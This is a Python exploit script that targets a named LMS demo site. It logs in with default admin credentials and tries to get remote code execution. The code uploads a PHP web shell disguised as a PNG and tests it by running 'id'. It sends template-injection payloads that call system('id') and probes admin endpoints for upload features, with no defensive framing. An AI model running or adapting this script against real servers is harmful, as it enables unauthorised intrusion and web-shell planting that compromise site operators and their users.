import requests
import re
import time
import base64

BASE_URL = "https://lms.rocket-soft.org"
ADMIN_EMAIL = "admin@demo.com"
ADMIN_PASS = "admin"

session = requests.Session()

def login():
    print("[*] Logging in as Admin...")
    try:
        r = session.get(f"{BASE_URL}/admin/login")
        csrf_token = re.search(r'name="_token" value="([^"]+)"', r.text).group(1)
        data = {"_token": csrf_token, "email": ADMIN_EMAIL, "password": ADMIN_PASS}
        r = session.post(f"{BASE_URL}/admin/login", data=data)
        if "/admin" in r.url or "/panel" in r.url:
            print("[+] Login successful.")
            return True
        else:
            print("[-] Login failed.")
            return False
    except Exception as e:
        print(f"[-] Login error: {e}")
        return False

def get_csrf(url):
    try:
        r = session.get(url)
        match = re.search(r'name="_token" value="([^"]+)"', r.text)
        if match:
            return match.group(1), r.text
        return None, r.text
    except:
        return None, ""

def exploit_landing_builder():
    """Try RCE via Landing Builder if available"""
    print("\n[*] Checking Landing Builder...")
    
    endpoints = [
        "/admin/landing",
        "/admin/landing-builder",
        "/admin/landings",
        "/admin/pages",
    ]
    
    for endpoint in endpoints:
        r = session.get(f"{BASE_URL}{endpoint}")
        if r.status_code == 200:
            print(f"[+] Found: {endpoint}")
            
            # Look for create/edit options
            create_links = re.findall(r'href=["\']([^"\']*create[^"\']*)["\']', r.text)
            edit_links = re.findall(r'href=["\']([^"\']*edit[^"\']*)["\']', r.text)
            
            print(f"    Create links: {create_links[:3]}")
            print(f"    Edit links: {edit_links[:3]}")
            
            # Check for direct file upload in landing builder
            if 'upload' in r.text.lower() or 'image' in r.text.lower():
                print("    [!] Upload functionality detected")
                
    return False

def exploit_avatar_upload():
    """Try RCE via profile avatar/image upload"""
    print("\n[*] Attempting RCE via Avatar/Profile Image Upload...")
    
    # Go to profile settings
    profile_endpoints = [
        "/panel/setting",
        "/panel/setting/step/1",
        "/panel/profile",
        "/admin/users/1/edit",
    ]
    
    shell_payload = b"<?php system($_GET['c']); ?>"
    gif_shell = b"GIF89a<?php system($_GET['c']); ?>"
    
    for endpoint in profile_endpoints:
        csrf, page = get_csrf(f"{BASE_URL}{endpoint}")
        if not csrf:
            continue
            
        print(f"\n[*] Testing: {endpoint}")
        
        # Find file input field names
        file_inputs = re.findall(r'name=["\']([^"\']*(?:avatar|image|photo|profile)[^"\']*)["\']', page, re.IGNORECASE)
        print(f"    File inputs: {file_inputs}")
        
        # Also look for data-* attributes on upload buttons
        upload_buttons = re.findall(r'data-(?:action|url)=["\']([^"\']+)["\']', page)
        print(f"    Upload URLs: {upload_buttons[:5]}")
        
        # Try AJAX upload if found
        for upload_url in upload_buttons:
            if 'upload' in upload_url.lower() or 'store' in upload_url.lower():
                full_url = upload_url if upload_url.startswith('http') else f"{BASE_URL}{upload_url}"
                
                files = {
                    'file': ('shell.php.png', gif_shell, 'image/png'),
                }
                data = {'_token': csrf}
                
                try:
                    r = session.post(full_url, files=files, data=data)
                    print(f"    Upload to {upload_url}: Status {r.status_code}")
                    
                    if r.status_code == 200:
                        # Check response for uploaded file path
                        paths = re.findall(r'((?:/store|/storage|/uploads)[^"\']+\.(?:php|png)[^"\']*)', r.text)
                        print(f"    Possible paths: {paths}")
                        
                        for path in paths:
                            check_url = f"{BASE_URL}{path}"
                            if '.php' in path:
                                check = session.get(f"{check_url}?c=id")
                                if "uid=" in check.text:
                                    print(f"\n[!!!] RCE SUCCESS! Shell: {check_url}")
                                    return True
                except Exception as e:
                    print(f"    Error: {e}")
    
    return False

def exploit_phar_deserialization():
    """Try PHAR deserialization if file operations use user-supplied paths"""
    print("\n[*] Checking for PHAR Deserialization vectors...")
    
    # This is more advanced - look for image processing or file include operations
    # that might process a PHAR archive disguised as an image
    
    # Check if we can upload and reference files
    print("    [*] PHAR exploitation requires: 1) Upload capability 2) File operation trigger")
    print("    [*] Skipping - requires manual analysis of file processing code")
    
    return False

def exploit_ssti():
    """Try SSTI (Server-Side Template Injection) in various input fields"""
    print("\n[*] Testing for SSTI in user inputs...")
    
    ssti_payloads = [
        "{{7*7}}",  # Twig/Jinja
        "${7*7}",   # Smarty/Velocity
        "{7*7}",    # Blade raw
        "{{system('id')}}",
        "@php system('id') @endphp",
    ]
    
    # Try in profile bio/about field
    csrf, page = get_csrf(f"{BASE_URL}/panel/setting")
    
    for payload in ssti_payloads[:2]:  # Test just first two for speed
        data = {
            '_token': csrf,
            'about': payload,
            'bio': payload,
        }
        
        try:
            r = session.post(f"{BASE_URL}/panel/setting", data=data, allow_redirects=False)
            if r.status_code in [200, 302]:
                # Check if template was rendered
                check = session.get(f"{BASE_URL}/panel/setting")
                if "49" in check.text or "uid=" in check.text:
                    print(f"    [!] SSTI works with payload: {payload}")
                    return True
        except:
            pass
    
    print("    [-] No SSTI detected")
    return False

def main():
    if not login():
        return
    
    exploit_landing_builder()
    exploit_avatar_upload()
    exploit_ssti()
    exploit_phar_deserialization()
    
    print("\n[*] All RCE vectors explored. See results above.")

if __name__ == "__main__":
    main()
